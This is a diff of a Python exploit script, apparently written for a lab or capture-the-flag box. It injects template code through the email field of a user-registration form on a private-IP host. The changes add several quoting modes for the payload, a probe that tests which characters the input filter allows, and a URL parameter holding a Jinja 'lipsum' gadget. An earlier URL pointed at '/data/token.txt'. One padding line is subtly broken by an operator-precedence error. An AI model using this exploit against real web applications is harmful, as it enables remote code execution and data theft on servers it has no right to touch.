@@ -1,22 +1,32 @@
 #!/usr/bin/env python3
 import requests
-from urllib.parse import quote_plus
+from urllib.parse import quote_plus, urlencode,quote
 from bs4 import BeautifulSoup
 from argparse import ArgumentParser
+import sys
 
 
 class SSTI():
-	def __init__(self, url, debug, setvar):
+	def __init__(self, url, debug, status, min_len=6):
 		self.url = url
 		self.debug = debug
 		self.count = 0
-		self.set = setvar
+		self.status = status
+		self.min_len = min_len
 
 	def register(self, code, pw='a'):
-		if self.set:
-			user = '{%' + quote_plus(code) + '%}@b.co'
-		else:
-			user = '{{' + quote_plus(code) + '}}@b.co'
+		quoted_code = {
+			0: '{{' + quote_plus(code) + '}}',
+			1: code,
+			2: quote_plus(code),
+			3: '{%' + quote_plus(code) + '%}'
+		}
+
+		user = quoted_code[self.status] + '@b.co'
+		if len(user) < self.min_len:
+			user = user.replace('@', '@' +
+								'b' * self.min_len - len(user))
+
 		if self.debug:
 			print(user)
 
@@ -58,18 +68,31 @@ class SSTI():
 			self.count += 1
 			return self.register(code, pw)
 
+	def get_valid_chars(self):
+		for i in range(128):
+			if 'Invalid' not in self.register(chr(i)):
+				print(chr(i), end='')
+				sys.stdout.flush()
+		print()
+
+
 
 def get_args():
 	parser = ArgumentParser()
-	parser.add_argument('code', help='Code to inject')
+	parser.add_argument('-i', '--code', help='Code to inject')
 	parser.add_argument('-v', action='count', default=0, help='Verbosity')
-	parser.add_argument('-s', '--set', action='store_true',
-						help='Set a variable')
+	parser.add_argument('-q', '--quote', action='count', default=0)
+	parser.add_argument('-c', '--chars', action='store_true')
 	return parser.parse_args()
 
 
 if __name__ == '__main__':
 	args = get_args()
-	temp = SSTI('http://10.102.1.119/user/register?o=/data/token.txt', debug=args.v,
-				setvar=args.set)
-	print(temp.register(args.code))
+	url = 'http://10.102.0.62/user/register?c=(L=lipsum)'
+
+	if args.chars:
+		s = SSTI(url, debug=args.v, status=1)
+		s.get_valid_chars()
+	else:
+		temp = SSTI(url, debug=args.v, status=args.quote)
+		print(temp.register(args.code))
